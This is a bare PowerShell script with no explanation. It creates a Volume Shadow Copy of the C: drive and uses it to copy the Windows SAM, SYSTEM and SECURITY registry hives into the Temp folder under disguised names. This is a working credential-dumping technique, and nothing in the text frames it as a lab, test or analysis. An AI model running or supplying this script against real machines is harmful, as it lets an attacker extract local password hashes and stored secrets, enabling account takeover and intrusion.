$s=((gwmi Win32_ShadowCopy -List).Create('C:\','ClientAccessible')).ShadowID
$v=(gwmi Win32_ShadowCopy|?{$_.ID -eq $s}).DeviceObject
$b=$v+'\Windows\System32\config\'
[IO.File]::Copy($b+'SAM',      'C:\Windows\Temp\s.dat', $true)
[IO.File]::Copy($b+'SYSTEM',   'C:\Windows\Temp\y.dat', $true)
[IO.File]::Copy($b+'SECURITY', 'C:\Windows\Temp\e.dat', $true)
